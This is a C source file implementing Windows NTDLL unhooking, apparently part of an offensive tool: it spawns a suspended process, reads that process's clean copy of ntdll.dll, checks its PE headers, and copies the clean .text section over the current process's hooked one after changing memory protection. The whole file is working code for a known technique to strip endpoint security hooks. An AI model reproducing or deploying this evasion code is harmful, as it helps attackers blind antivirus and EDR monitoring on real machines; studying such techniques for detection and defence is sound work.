#include "box.h"

// https://www.jeremyong.com/winapi/io/2024/11/03/windows-memory-mapped-file-io/
// https://github.com/SaadAhla/ntdlll-unhooking-collection/blob/main/Ntdll%20Unhooking/3%20-%20Unhooking%20NTDLL%20from%20Suspended%20Process/Ntdll_SusProcess/Ntdll_SusProcess.cpp

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID,
	OUT PVOID* NtdllBuf
)
{

	BOOL State = TRUE;
	NTSTATUS status = NULL;
	MODULEINFO mi;
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;



	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	HMODULE NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NtdllHandle == NULL)
	{
		PRINT_ERROR("GetModuleHandleW");
		State = FALSE;
	}

	INFO("[0x%p] Loaded ntdll.dll Base Address", NtdllHandle);

	HANDLE self = GetCurrentProcess();
	GetModuleInformation(self, NtdllHandle, &mi, sizeof(mi));
	LPVOID pNtdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
	SIZE_T dwRead;

	NtReadVirtualMemory g_NtReadVirtualMemory = (NtReadVirtualMemory)GetProcAddress(NtdllHandle, "NtReadVirtualMemory");

	status = g_NtReadVirtualMemory(ProcessInfo.hProcess, (LPCVOID)mi.lpBaseOfDll, pNtdll, mi.SizeOfImage, &dwRead);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtReadVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	*NtdllBuf = pNtdll;
	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;

	if (ResumeThread(ProcessInfo.hThread) && TerminateProcess(ProcessInfo.hProcess, 0))
	{
		OKAY("Process Terminated!");
	}

CLEANUP:

	return State;

}

BOOL CheckHeaders
(
	IN HMODULE NtdllHandle,
	IN PVOID NtdllBuf,
	OUT PVOID* pHookedNtdllTxt,
	OUT PVOID* pUnhookedNtdllTxt,
	OUT SIZE_T* pNtdllTxtSize
)

{
	PVOID HookedNtdllTxt, UnhookedNtdllTxt = NULL;
	SIZE_T NtdllTxtSize = NULL;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)NtdllHandle;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Image Dos Headers");
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((PBYTE)NtdllHandle + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Image Nt Headers");
		return FALSE;
	}

	PIMAGE_DOS_HEADER pImgDos2 = (PIMAGE_DOS_HEADER)NtdllBuf;
	if (pImgDos2->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Image Dos Headers");
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImgNt2 = (PIMAGE_NT_HEADERS)((PBYTE)NtdllBuf + pImgDos2->e_lfanew);
	if (pImgNt2->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Image Nt Headers");
		return FALSE;
	}

	INFO("[Loaded] ImageBase: [0x%p]", NtdllHandle);
	INFO("[Mapped] ImageBase: [0x%p]", NtdllBuf);

	INFO("[Mapped] SizeOfImage: [0x%X]", pImgNt2->OptionalHeader.SizeOfImage);
	INFO("[Loaded] SizeOfImage: [0x%X]", pImgNt->OptionalHeader.SizeOfImage);

	if (!(pImgNt2->OptionalHeader.SizeOfImage == pImgNt->OptionalHeader.SizeOfImage))
	{
		WARN("SizeOfImage Not Matching! Mapped Ntdll Likely Corrupted!");
		return FALSE;
	}

	OKAY("SizeOfImage Matched! Properly Mapped Ntdll");

	HookedNtdllTxt = (PVOID)(pImgNt->OptionalHeader.BaseOfCode + (ULONG_PTR)NtdllHandle);
	UnhookedNtdllTxt = (PVOID)(pImgNt2->OptionalHeader.BaseOfCode + (ULONG_PTR)NtdllBuf);
	NtdllTxtSize = pImgNt->OptionalHeader.SizeOfCode;

	printf(
		"[v] [0x%p] Hooked Ntdll Text Section Address\n"
		"[v] [0x%p] Unhooked Ntdll Text Section Address\n"
		"[v] [0x%p] Text Section Size\n",
		HookedNtdllTxt, UnhookedNtdllTxt, NtdllTxtSize
	);

	*pHookedNtdllTxt = HookedNtdllTxt;
	*pUnhookedNtdllTxt = UnhookedNtdllTxt;
	*pNtdllTxtSize = NtdllTxtSize;

	return TRUE;

}

BOOL CheckState
(
	IN PVOID pHookedNtdllTxt,
	IN PVOID pUnhookedNtdllTxt,
	IN SIZE_T pNtdllTxtSize
)

{

	DWORD dwOldProt = NULL;

	if (!pHookedNtdllTxt || !pUnhookedNtdllTxt || !pNtdllTxtSize)
		return FALSE;

	if (!VirtualProtect(pHookedNtdllTxt, pNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect [1]");
		return FALSE;
	}

	INFO("[0x%p] Hooked VirtualProtect", pHookedNtdllTxt);

	memcpy(pHookedNtdllTxt, pUnhookedNtdllTxt, pNtdllTxtSize);

	if (!VirtualProtect(pHookedNtdllTxt, pNtdllTxtSize, dwOldProt, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect [2]");
		return FALSE;
	}

	INFO("[0x%p] Unhooked VirtualProtect", pHookedNtdllTxt);

	OKAY("Done!");

	return TRUE;

}